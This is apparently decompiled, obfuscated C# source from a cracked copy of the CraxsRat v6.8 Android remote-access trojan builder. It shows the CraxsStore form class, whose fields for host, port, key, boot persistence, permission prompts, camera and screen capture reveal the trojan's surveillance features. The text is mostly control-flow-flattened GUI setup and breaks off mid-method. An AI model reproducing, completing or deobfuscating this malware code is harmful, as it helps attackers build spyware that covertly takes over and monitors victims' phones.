// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.CraxsStore
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.My;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class CraxsStore : Form
  {
    public Client ClassClient;
    private IContainer components;
    public string loadingtext;
    public string conecttext;
    public bool stage1;
    public bool stage2;
    public bool loadsuccess;
    public bool loadfaild;
    public object need_write;
    public object need_read;
    public object need_forground;
    public object need_syswinow;
    public object need_boot;
    public object need_all;
    public object ASKPRIM_all;
    private string N__ask_prim_;
    public static byte f004A1D;
    private string N__access_ask_;
    public static byte f004A1F;
    private string N_newEngineWorkerins;
    public static byte f004A21;
    private string N__srv_worker_;
    public static byte f004A23;
    private string N_cap_sc_;
    public static byte f004A25;
    private string N_update_app_;
    public static byte f004A27;
    private string N_WackMeUpJob;
    public static byte f004A29;
    private string N_ClassGen;
    public static byte f004A2B;
    private string N__ask_draw_;
    public static byte f004A2D;
    private string N__ask_battary_;
    public static byte f004A2F;
    private string N__CamActivity_;
    public static byte f004A31;
    private string N__SCRActivity_;
    public static byte f004A33;
    private string N__webviewer_;
    public static byte f004A35;
    private string N__scctrl_;
    public static byte f004A37;
    private string newgetbyts;
    private string newsrvrun;
    private string split1;
    private string split2;
    private string split3;
    private string split4;
    private string newhost;
    private string newport;
    private string newkey;
    private string newalive;
    private string newname;
    private string neweco;
    private string newconect;
    private string newsokt;
    private string newstrtconct;
    private string newcnl;
    private string newcnm;
    private string newsndmthd;
    private string newforuce;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = 167659975;
      while (true)
      {
        int num2 = num1;
        uint num3;
        ComponentResourceManager componentResourceManager;
        DataGridViewCellStyle gridViewCellStyle1;
        DataGridViewCellStyle gridViewCellStyle2;
        DataGridViewCellStyle gridViewCellStyle3;
        DataGridViewCellStyle gridViewCellStyle4;
        DataGridViewCellStyle gridViewCellStyle5;
        switch ((num3 = (uint) ((-((754506209 * (800421634 ^ ~(-931413594 - 1373612547)) ^ -(~1826015596 ^ -507123886 ^ 196614750)) - num2 - (-626716971 * -(-1345447512 * -880902843) - 134693451 * (698476173 - 1562734463) * -639103519)) ^ 1254143233 - 1171236340 ^ 575986311 * 603557772) - 1787746613 ^ -1644640925)) % 608U)
        {
          case 0:
            this.DrakeUIButtonIcon3.FillColor = Color.Black;
            num1 = (int) num3 * -1456005599 ^ -1825813037;
            continue;
          case 1:
            this.downprogress.ForeColor = Color.FromArgb(230, 80, 80);
            num1 = (int) num3 * 156124491 ^ -176829987;
            continue;
          case 2:
            this.DrakeUIButtonIcon3.RectHoverColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -298859965 ^ 607801327;
            continue;
          case 3:
            this.Label15.Dock = DockStyle.Top;
            num1 = (int) num3 * 1694186237 ^ 347115745;
            continue;
          case 4:
            this.checkDraw = new DrakeUICheckBox();
            num1 = (int) num3 * -801458379 ^ -841996907;
            continue;
          case 5:
            this.Label6.Cursor = Cursors.Default;
            num1 = (int) num3 * -1726284549 ^ 815608489;
            continue;
          case 6:
            this.DrakeUIButtonIcon13.RectSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon13.Size = new Size(45, 42);
            num1 = (int) num3 * -1587093691 ^ 514687277;
            continue;
          case 7:
            this.Label1.FlatStyle = FlatStyle.Flat;
            num1 = (int) num3 * -879739686 ^ -1645417373;
            continue;
          case 8:
            this.reqbtn.FillColor = Color.Black;
            this.reqbtn.FillDisableColor = Color.FromArgb(20, 20, 20);
            this.reqbtn.Font = new Font(EXGuarder.\u0034C5F3E79, 19f);
            this.reqbtn.ForeColor = Color.FromArgb(14, 110, 178);
            num1 = (int) num3 * -1961290190 ^ -1647455267;
            continue;
          case 9:
            this.TabPage1.Controls.Add((Control) this.Label4);
            num1 = (int) num3 * 121358035 ^ 969872285;
            continue;
          case 10:
            this.DrakeUITabControl1.TabSelectedHighColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUITabControl1.TabUnSelectedForeColor = Color.FromArgb(240, 240, 240);
            num1 = (int) num3 * -1054100713 ^ -1391675397;
            continue;
          case 11:
            this.DGVSTORE.AllowUserToResizeColumns = false;
            num1 = (int) num3 * 1482278175 ^ 223003789;
            continue;
          case 12:
            this.worklabel.Size = new Size(791, 29);
            num1 = (int) num3 * 1392968957 ^ 1812274931;
            continue;
          case 13:
            this.Label8.TabIndex = 46;
            this.Label8.Tag = (object) EXGuarder.\u00311734B49;
            this.Label8.Text = EXGuarder.\u0035B774011;
            num1 = (int) num3 * -1246800269 ^ 1653702801;
            continue;
          case 14:
            this.Host.Minimum = (double) int.MinValue;
            num1 = (int) num3 * 780572590 ^ 1696398577;
            continue;
          case 15:
            this.Label17.Name = EXGuarder.\u0034B2D553A;
            num1 = (int) num3 * 1159302927 ^ 108674140;
            continue;
          case 16:
            this.Label3.Text = EXGuarder.\u00354073E0D;
            num1 = (int) num3 * -2058769148 ^ -427362197;
            continue;
          case 17:
            this.Label4.Name = EXGuarder.\u00368083E14;
            this.Label4.Size = new Size(108, 29);
            num1 = (int) num3 * 1405666695 ^ 724476130;
            continue;
          case 18:
            this.DrakeUIButtonIcon13.Radius = 25;
            num1 = (int) num3 * 1123490420 ^ 682491542;
            continue;
          case 19:
            this.titletext = new DrakeUITextBox();
            num1 = (int) num3 * 1491607018 ^ 1199948419;
            continue;
          case 20:
            this.Status.FillWeight = 45f;
            num1 = (int) num3 * 1320596068 ^ 736170980;
            continue;
          case 21:
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            num1 = (int) num3 * -903883365 ^ 342604438;
            continue;
          case 22:
            this.msgtext.Size = new Size(248, 30);
            this.msgtext.Style = UIStyle.Custom;
            num1 = (int) num3 * 1095875115 ^ 282955965;
            continue;
          case 23:
            this.DrakeUITabControl1.Dock = DockStyle.Fill;
            num1 = (int) num3 * -2075786148 ^ 1441137465;
            continue;
          case 24:
            this.workpanel.ResumeLayout(false);
            num1 = (int) num3 * 193668773 ^ 721242003;
            continue;
          case 25:
            this.CLiname.Margin = new Padding(4, 5, 4, 5);
            this.CLiname.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * -1364103453 ^ -721533763;
            continue;
          case 26:
            this.ToolTips.BackColor = Color.Black;
            num1 = (int) num3 * -1501331400 ^ 1744473841;
            continue;
          case 27:
            ((ISupportInitialize) this.DrakeUIImageButton1).EndInit();
            num1 = (int) num3 * -1729952401 ^ 997990841;
            continue;
          case 28:
            this.Label1.Size = new Size(212, 56);
            this.Label1.TabIndex = 35;
            num1 = (int) num3 * -1284122428 ^ -959025093;
            continue;
          case 29:
            this.Panel1.Size = new Size(1184, 56);
            this.Panel1.TabIndex = 34;
            num1 = (int) num3 * -1566310431 ^ -1149585469;
            continue;
          case 30:
            this.BackColor = Color.Black;
            this.BackgroundImageLayout = ImageLayout.Zoom;
            this.ClientSize = new Size(1184, 803);
            num1 = (int) num3 * -841596519 ^ -1671275932;
            continue;
          case 31:
            this.Label9.Text = EXGuarder.\u003676E450F;
            num1 = (int) num3 * -2135724871 ^ -1002123773;
            continue;
          case 32:
            this.ToolTips.SetToolTip((Control) this.DrakeUIButtonIcon3, EXGuarder.\u003770E683D);
            num1 = (int) num3 * -331495964 ^ 762082631;
            continue;
          case 33:
            this.DrakeUIButtonIcon2.StyleCustomMode = true;
            num1 = (int) num3 * -2034462608 ^ 1758761602;
            continue;
          case 34:
            this.showworkbtn.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            this.showworkbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -812160450 ^ -926236908;
            continue;
          case 35:
            this.workimage.TabStop = false;
            num1 = (int) num3 * 2147177582 ^ -671493820;
            continue;
          case 36:
            this.Label12.Font = new Font(EXGuarder.\u0033E1A7215, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 1411894215 ^ 1641255895;
            continue;
          case 37:
            this.logopic.Name = EXGuarder.\u0036B091A02;
            this.logopic.Size = new Size(1184, 558);
            num1 = (int) num3 * -1334057376 ^ 874635107;
            continue;
          case 38:
            this.DrakeUIImageButton1.Location = new Point(0, 0);
            this.DrakeUIImageButton1.Name = EXGuarder.\u00305567938;
            num1 = (int) num3 * -664553524 ^ -1641210306;
            continue;
          case 39:
            this.DGVSTORE.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            num1 = (int) num3 * -1767005221 ^ 2137397163;
            continue;
          case 40:
            this.DGVSTORE.GridColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 290906747 ^ -1512655114;
            continue;
          case 42:
            this.TabPage1.Controls.Add((Control) this.Label6);
            this.TabPage1.Controls.Add((Control) this.Label5);
            num1 = (int) num3 * -1557194558 ^ -93925962;
            continue;
          case 43:
            this.DrakeUITabControl1.SelectedIndex = 0;
            this.DrakeUITabControl1.Size = new Size(1184, 724);
            num1 = (int) num3 * -572556941 ^ -2084434319;
            continue;
          case 44:
            this.Label17.Dock = DockStyle.Top;
            num1 = (int) num3 * -1328124012 ^ -783669633;
            continue;
          case 45:
            this.DrakeUIAvatar5.TabIndex = 42;
            this.DrakeUIAvatar5.Text = EXGuarder.\u00313397506;
            num1 = (int) num3 * -1877504688 ^ -146153476;
            continue;
          case 46:
            this.Host.Size = new Size(228, 30);
            num1 = (int) num3 * 1093889014 ^ -1305212599;
            continue;
          case 47:
            this.DrakeUIButtonIcon3.Style = UIStyle.Custom;
            num1 = (int) num3 * 85708933 ^ 1379848975;
            continue;
          case 48:
            this.DrakeUIButtonIcon3.Cursor = Cursors.Hand;
            num1 = (int) num3 * 286422625 ^ -521549134;
            continue;
          case 49:
            this.DrakeUIAvatar5.FillColor = Color.Black;
            this.DrakeUIAvatar5.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * -1071939100 ^ 1661392958;
            continue;
          case 50:
            this.DrakeUIAvatar5.SymbolSize = 25;
            num1 = (int) num3 * -369236315 ^ -1893899743;
            continue;
          case 51:
            this.Host.Style = UIStyle.Custom;
            this.Host.StyleCustomMode = true;
            num1 = (int) num3 * 885741987 ^ 164011831;
            continue;
          case 52:
            this.CLiname.Minimum = (double) int.MinValue;
            this.CLiname.Name = EXGuarder.\u0035B2B6B2A;
            num1 = (int) num3 * -1657677792 ^ -463303995;
            continue;
          case 53:
            this.lockpanel.TabIndex = 15;
            this.Label16.Dock = DockStyle.Top;
            num1 = (int) num3 * -1106668496 ^ -688002712;
            continue;
          case 54:
            this.workpanel.Name = EXGuarder.\u0031E677038;
            num1 = (int) num3 * 727131650 ^ -1194361796;
            continue;
          case 55:
            this.strpasstext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1477894861 ^ -1927528894;
            continue;
          case 56:
            this.TabPage4.Text = EXGuarder.\u003725F0A2F;
            this.workpanel.BackColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * -717865719 ^ 1153044941;
            continue;
          case 57:
            this.TheKey.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            this.TheKey.ForeColor = Color.White;
            num1 = (int) num3 * -773640724 ^ -1195005695;
            continue;
          case 58:
            this.Label10.AutoSize = true;
            num1 = (int) num3 * 2049961242 ^ -44585764;
            continue;
          case 59:
            this.MinimumSize = new Size(1184, 803);
            this.Name = EXGuarder.\u00360215040;
            this.ShowIcon = false;
            num1 = (int) num3 * -258611331 ^ -505231680;
            continue;
          case 60:
            this.mainpanel.Controls.Add((Control) this.DrakeUITabControl1);
            num1 = (int) num3 * 43110539 ^ 1578648880;
            continue;
          case 61:
            this.Label10.Text = EXGuarder.\u00332461F3D;
            this.titletext.Cursor = Cursors.IBeam;
            num1 = (int) num3 * -1451374982 ^ -1800973811;
            continue;
          case 62:
            this.reqbtn.Text = EXGuarder.\u0035F3B704C;
            this.storebtn.Cursor = Cursors.Hand;
            this.storebtn.Enabled = false;
            num1 = (int) num3 * -261515705 ^ 2010706696;
            continue;
          case 63:
            this.DGVSTORE.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            this.DGVSTORE.BackgroundColor = Color.Black;
            num1 = (int) num3 * 1022416440 ^ -1024795563;
            continue;
          case 64:
            this.sizeapp = new DataGridViewTextBoxColumn();
            this.verapp = new DataGridViewTextBoxColumn();
            this.Status = new DataGridViewTextBoxColumn();
            num1 = (int) num3 * 31266739 ^ -244593800;
            continue;
          case 65:
            this.ToolTips.SetToolTip((Control) this.DrakeUIButtonIcon1, EXGuarder.\u00365450F18);
            this.Label1.Cursor = Cursors.Default;
            num1 = (int) num3 * 23383775 ^ -449719680;
            continue;
          case 66:
            this.checksuper.Location = new Point(83, 286);
            this.checksuper.Name = EXGuarder.\u003195E6961;
            num1 = (int) num3 * 1422613482 ^ 1308510588;
            continue;
          case 67:
            gridViewCellStyle5.BackColor = Color.Black;
            num1 = (int) num3 * 843392506 ^ -1326274561;
            continue;
          case 68:
            this.b_ok.RectHoverColor = Color.White;
            num1 = (int) num3 * -1489606501 ^ -1421166101;
            continue;
          case 69:
            this.Label13 = new Label();
            num1 = (int) num3 * 1114438297 ^ 1610417752;
            continue;
          case 70:
            this.Label10 = new Label();
            num1 = (int) num3 * -1125066968 ^ -300154547;
            continue;
          case 71:
            this.ToolTips.ForeColor = Color.White;
            num1 = (int) num3 * 903459720 ^ -2131811197;
            continue;
          case 72:
            this.TabPage2.Name = EXGuarder.\u00329056323;
            num1 = (int) num3 * -414758896 ^ -11033801;
            continue;
          case 73:
            this.b_ok.RectPressColor = Color.White;
            this.b_ok.RectSelectedColor = Color.White;
            num1 = (int) num3 * -1482383890 ^ 898904947;
            continue;
          case 74:
            this.PictureBox1.Dock = DockStyle.Top;
            num1 = (int) num3 * -920719749 ^ 159925327;
            continue;
          case 75:
            this.Port.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1047634677 ^ -1050556331;
            continue;
          case 76:
            this.DGVSTORE.Size = new Size(1184, 684);
            num1 = (int) num3 * -413131221 ^ 1333887998;
            continue;
          case 77:
            this.ToolTips.OwnerDraw = true;
            this.ToolTips.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1820836914 ^ -1954866376;
            continue;
          case 78:
            this.lockpanel.Controls.Add((Control) this.Label16);
            num1 = (int) num3 * -1627637931 ^ 505715014;
            continue;
          case 79:
            this.lockpanel.Location = new Point(0, 0);
            this.lockpanel.Name = EXGuarder.\u003501B5D27;
            num1 = (int) num3 * -736088778 ^ -1215352918;
            continue;
          case 80:
            this.DrakeUIButtonIcon13.FillColor = Color.Black;
            this.DrakeUIButtonIcon13.Font = new Font(EXGuarder.\u0034C5F3E79, 9f);
            num1 = (int) num3 * 2124972406 ^ 1698911244;
            continue;
          case 81:
            this.titletext.FillColor = Color.Black;
            this.titletext.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            this.titletext.ForeColor = Color.White;
            this.titletext.Location = new Point(802, 496);
            num1 = (int) num3 * 1616867784 ^ -111412585;
            continue;
          case 82:
            this.Label9.Font = new Font(EXGuarder.\u003214C7825, 18f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.Label9.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 2133450392 ^ -539190878;
            continue;
          case 83:
            this.worklog.StyleCustomMode = true;
            this.worklog.TabIndex = 40;
            num1 = (int) num3 * 919151546 ^ -1856312879;
            continue;
          case 84:
            gridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle3.BackColor = Color.Black;
            gridViewCellStyle3.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            gridViewCellStyle3.ForeColor = Color.White;
            num1 = (int) num3 * 2063192196 ^ -627511312;
            continue;
          case 85:
            this.DrakeUIButtonIcon5.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -632410410 ^ -1084855947;
            continue;
          case 86:
            this.DrakeUIButtonIcon1.Style = UIStyle.Custom;
            num1 = (int) num3 * -1370191446 ^ 1594486261;
            continue;
          case 87:
            this.reqbtn.Enabled = false;
            num1 = (int) num3 * 2016308106 ^ 2106314908;
            continue;
          case 88:
            this.DrakeUIImageButton1.Dock = DockStyle.Left;
            num1 = (int) num3 * -274991223 ^ -802530791;
            continue;
          case 89:
            this.workimage.Size = new Size(65, 65);
            this.workimage.SizeMode = PictureBoxSizeMode.StretchImage;
            num1 = (int) num3 * 670571452 ^ 331529294;
            continue;
          case 90:
            this.Label9.Size = new Size(190, 34);
            num1 = (int) num3 * -1955579106 ^ 1749529347;
            continue;
          case 91:
            this.ComboPrims.TabIndex = 47;
            this.Label8.AutoSize = true;
            this.Label8.Cursor = Cursors.Default;
            num1 = (int) num3 * -1942075835 ^ -639093653;
            continue;
          case 92:
            this.DGVSTORE.DefaultCellStyle = gridViewCellStyle1;
            num1 = (int) num3 * 736670805 ^ -1938633580;
            continue;
          case 93:
            this.Port.Name = EXGuarder.\u0035F22734D;
            num1 = (int) num3 * -864926558 ^ 1656106407;
            continue;
          case 94:
            goto label_1;
          case 95:
            this.titletext.TextAlignment = ContentAlignment.TopCenter;
            this.Label2.AutoSize = true;
            num1 = (int) num3 * 386972117 ^ -851317757;
            continue;
          case 96:
            this.ImageList1.TransparentColor = Color.Transparent;
            num1 = (int) num3 * -771540014 ^ -2010134590;
            continue;
          case 97:
            this.Label17.Font = new Font(EXGuarder.\u003715A3F2E, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -713884049 ^ -1637331588;
            continue;
          case 98:
            this.Panelhome.Controls.Add((Control) this.storebtn);
            num1 = (int) num3 * -965296983 ^ -390306440;
            continue;
          case 99:
            this.TabPage1.Controls.Add((Control) this.checkkill);
            num1 = (int) num3 * -811115062 ^ 1652193027;
            continue;
          case 100:
            this.downprogress.Dock = DockStyle.Bottom;
            this.downprogress.FillColor = Color.FromArgb((int) byte.MaxValue, 235, 238);
            num1 = (int) num3 * 1009134496 ^ 708238713;
            continue;
          case 101:
            this.worklog.Padding = new Padding(7, 6, 7, 6);
            this.worklog.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.worklog.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -720400766 ^ -383605663;
            continue;
          case 102:
            this.mainpanel.Controls.Add((Control) this.Panel1);
            this.mainpanel.Dock = DockStyle.Fill;
            this.mainpanel.Location = new Point(0, 0);
            num1 = (int) num3 * -974757804 ^ -409551778;
            continue;
          case 103:
            this.Panel3.SuspendLayout();
            num1 = (int) num3 * -554315643 ^ -1834595271;
            continue;
          case 104:
            this.DrakeUIAvatar5.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIAvatar5.Location = new Point(1043, 415);
            num1 = (int) num3 * -454689939 ^ -1637054124;
            continue;
          case 105:
            gridViewCellStyle1.SelectionForeColor = Color.Black;
            num1 = (int) num3 * 2034272405 ^ 846997102;
            continue;
          case 106:
            this.Label12.Size = new Size(216, 29);
            this.Label12.TabIndex = 41;
            num1 = (int) num3 * 1844319112 ^ -583465260;
            continue;
          case 107:
            this.downprogress.Text = EXGuarder.\u00338126877;
            this.Panel1.Controls.Add((Control) this.DrakeUIButtonIcon1);
            num1 = (int) num3 * -1696057261 ^ -535247542;
            continue;
          case 108:
            this.Label17.TextAlign = ContentAlignment.TopCenter;
            num1 = (int) num3 * -165680588 ^ 20555581;
            continue;
          case 109:
            this.Label16.TabIndex = 35;
            this.Label16.Text = EXGuarder.\u00364042D52;
            num1 = (int) num3 * 871969129 ^ 962696934;
            continue;
          case 110:
            this.checkautoclick.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num3 * 1372331232 ^ 1003219800;
            continue;
          case 111:
            this.Label8.Size = new Size(216, 34);
            num1 = (int) num3 * 475032378 ^ 2095855997;
            continue;
          case 112:
            this.DrakeUIButtonIcon2.SymbolSize = 25;
            num1 = (int) num3 * -2117352590 ^ -2105999837;
            continue;
          case 113:
            this.TabPage2.Text = EXGuarder.\u0032A383E75;
            num1 = (int) num3 * -147063250 ^ 347593286;
            continue;
          case 114:
            this.Label14.Size = new Size(142, 27);
            num1 = (int) num3 * 51929265 ^ -1755225445;
            continue;
          case 115:
            this.Label10.Size = new Size(174, 29);
            this.Label10.TabIndex = 37;
            num1 = (int) num3 * -1268811864 ^ 970174451;
            continue;
          case 116:
            this.TabPage1.SuspendLayout();
            this.TabPage4.SuspendLayout();
            num1 = (int) num3 * 1045247361 ^ -220426540;
            continue;
          case 117:
            this.DrakeUIButtonIcon3.Symbol = 61527;
            this.DrakeUIButtonIcon3.SymbolSize = 25;
            num1 = (int) num3 * 1551350635 ^ -1983827832;
            continue;
          case 118:
            this.TheKey.Name = EXGuarder.\u00370490228;
            num1 = (int) num3 * -268410479 ^ -17210660;
            continue;
          case 119:
            this.Label6.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label6.Location = new Point(169, 372);
            num1 = (int) num3 * 881951637 ^ -537867327;
            continue;
          case 120:
            this.Label15 = new Label();
            ((ISupportInitialize) this.logopic).BeginInit();
            num1 = (int) num3 * 1423090443 ^ -1267651066;
            continue;
          case 121:
            this.DGVSTORE.ColumnHeadersDefaultCellStyle = gridViewCellStyle3;
            num1 = (int) num3 * 1179651412 ^ -1087987128;
            continue;
          case 122:
            this.DrakeUIButtonIcon2.RectHoverColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 52043117 ^ 337537188;
            continue;
          case 123:
            this.PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num3 * 190647297 ^ -1712931034;
            continue;
          case 124:
            this.worklabel.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1184259011 ^ -1014328904;
            continue;
          case 125:
            this.ImageList1 = new ImageList(this.components);
            this.downloadworker = new BackgroundWorker();
            this.lockpanel = new Panel();
            this.Label16 = new Label();
            this.PictureBox1 = new PictureBox();
            num1 = (int) num3 * -408510985 ^ -540913556;
            continue;
          case 126:
            this.Panelhome.ResumeLayout(false);
            this.lockpanel.ResumeLayout(false);
            num1 = (int) num3 * 975274473 ^ 410550955;
            continue;
          case (uint) sbyte.MaxValue:
            this.Label8.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -98445017 ^ -1303978405;
            continue;
          case 128:
            this.ToolTips.SetToolTip((Control) this.DrakeUIButtonIcon4, EXGuarder.\u0032B004727);
            this.worklabel.Font = new Font(EXGuarder.\u0033E1A7215, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -755563592 ^ 1982337070;
            continue;
          case 129:
            this.checkkill.Name = EXGuarder.\u0031A573A1F;
            num1 = (int) num3 * -514343792 ^ -1875940010;
            continue;
          case 130:
            this.workpanel.Controls.Add((Control) this.worklog);
            this.workpanel.Controls.Add((Control) this.workimage);
            num1 = (int) num3 * -1189598767 ^ 673686935;
            continue;
          case 131:
            this.Port.ForeColor = Color.White;
            num1 = (int) num3 * -503802328 ^ -590441066;
            continue;
          case 132:
            this.mainpanel.Name = EXGuarder.\u0035502750E;
            num1 = (int) num3 * 2057615447 ^ -270128289;
            continue;
          case 133:
            this.Port.TextAlignment = ContentAlignment.TopCenter;
            this.CLiname.Cursor = Cursors.IBeam;
            this.CLiname.FillColor = Color.Black;
            this.CLiname.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * -1247541469 ^ -32218338;
            continue;
          case 134:
            this.iconprim.ReadOnly = true;
            this.primname.FillWeight = 73.85786f;
            num1 = (int) num3 * -1295732435 ^ -213795143;
            continue;
          case 135:
            gridViewCellStyle2.BackColor = Color.Black;
            gridViewCellStyle2.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * -912980587 ^ -345808145;
            continue;
          case 136:
            this.reqbtn.RectDisableColor = Color.FromArgb(20, 20, 20);
            this.reqbtn.Size = new Size(283, 123);
            num1 = (int) num3 * 2130897566 ^ 637340120;
            continue;
          case 137:
            this.worklog.MaxLength = 140;
            num1 = (int) num3 * -2077229914 ^ -240138527;
            continue;
          case 138:
            this.showworkbtn.Location = new Point(1146, 658);
            num1 = (int) num3 * -1842608792 ^ -281073680;
            continue;
          case 139:
            this.Label17 = new Label();
            num1 = (int) num3 * 1798228715 ^ -591966253;
            continue;
          case 140:
            this.TabPage1.Controls.Add((Control) this.titletext);
            this.TabPage1.Controls.Add((Control) this.Label2);
            num1 = (int) num3 * 693204766 ^ 236422416;
            continue;
          case 141:
            this.Status.ReadOnly = true;
            num1 = (int) num3 * -1670483372 ^ 1879423135;
            continue;
          case 142:
            this.DrakeUIAvatar5.Name = EXGuarder.\u00313397506;
            num1 = (int) num3 * 1933778581 ^ -369292551;
            continue;
          case 143:
            ((ISupportInitialize) this.DrakeUIImageButton1).BeginInit();
            this.Panelhome.SuspendLayout();
            this.lockpanel.SuspendLayout();
            num1 = (int) num3 * -1001818127 ^ 1733937100;
            continue;
          case 144:
            this.verapp.HeaderText = EXGuarder.\u00303684251;
            this.verapp.Name = EXGuarder.\u00347363020;
            this.verapp.ReadOnly = true;
            num1 = (int) num3 * -1651290320 ^ -698740490;
            continue;
          case 145:
            this.Controls.Add((Control) this.Panelhome);
            num1 = (int) num3 * 1898588720 ^ -383227288;
            continue;
          case 146:
            this.Panel3 = new Panel();
            num1 = (int) num3 * -38360252 ^ 981945419;
            continue;
          case 147:
            this.Label3.TabIndex = 25;
            num1 = (int) num3 * 1471769962 ^ -2126270420;
            continue;
          case 148:
            this.Label5.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label5.Location = new Point(169, 281);
            num1 = (int) num3 * -1198921262 ^ 767487861;
            continue;
          case 149:
            this.statustext.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * -1423694541 ^ -2001518207;
            continue;
          case 150:
            this.TabPage1.Controls.Add((Control) this.Label8);
            num1 = (int) num3 * 1224861531 ^ -1991516358;
            continue;
          case 151:
            this.TabPage1.Controls.Add((Control) this.Label14);
            num1 = (int) num3 * -973276498 ^ -995881141;
            continue;
          case 152:
            this.checkDraw.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * -1574466320 ^ -1891631338;
            continue;
          case 153:
            this.DGVSTORE.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            num1 = (int) num3 * 371782693 ^ -998768396;
            continue;
          case 154:
            this.DrakeUIButtonIcon1.Radius = 25;
            this.DrakeUIButtonIcon1.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 565931867 ^ 1812483418;
            continue;
          case 155:
            this.workpanel.Controls.Add((Control) this.downprogress);
            num1 = (int) num3 * -335600193 ^ -536356094;
            continue;
          case 156:
            this.Label6.Font = new Font(EXGuarder.\u003214C7825, 18f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 110674631 ^ -680429931;
            continue;
          case 157:
            this.Label7.AutoSize = true;
            num1 = (int) num3 * -322327824 ^ 495485899;
            continue;
          case 158:
            this.CLiname.Radius = 15;
            num1 = (int) num3 * 180680511 ^ -1430078848;
            continue;
          case 159:
            this.DrakeUIButtonIcon12.Name = EXGuarder.\u003182B2D25;
            num1 = (int) num3 * 878266757 ^ 1909576406;
            continue;
          case 160:
            this.TabPage1.Controls.Add((Control) this.TheKey);
            num1 = (int) num3 * -1499414204 ^ -356728061;
            continue;
          case 161:
            this.Label15.Text = EXGuarder.\u0031C583E0C;
            num1 = (int) num3 * -1704493041 ^ 1599819869;
            continue;
          case 162:
            this.msgtext.Name = EXGuarder.\u00375302464;
            this.msgtext.Padding = new Padding(5);
            num1 = (int) num3 * -1383001077 ^ 535420970;
            continue;
          case 163:
            this.TheKey.Location = new Point(327, 118);
            this.TheKey.Margin = new Padding(4, 5, 4, 5);
            this.TheKey.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * 1877338630 ^ 1210994212;
            continue;
          case 164:
            this.DrakeUIButtonIcon4.StyleCustomMode = true;
            num1 = (int) num3 * 1008111524 ^ 723053059;
            continue;
          case 165:
            this.Label6.Tag = (object) EXGuarder.\u00311734B49;
            num1 = (int) num3 * -2102009007 ^ 1912907746;
            continue;
          case 166:
            this.DGVSTORE.RowHeadersDefaultCellStyle = gridViewCellStyle2;
            num1 = (int) num3 * -1579372459 ^ -527207854;
            continue;
          case 167:
            this.checkautoclick = new DrakeUICheckBox();
            num1 = (int) num3 * -1003115376 ^ -2093784412;
            continue;
          case 168:
            this.DrakeUIButtonIcon2.Radius = 25;
            num1 = (int) num3 * 1356787316 ^ 1887199107;
            continue;
          case 169:
            this.Label1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label1.Location = new Point(51, 0);
            this.Label1.Margin = new Padding(4, 0, 4, 0);
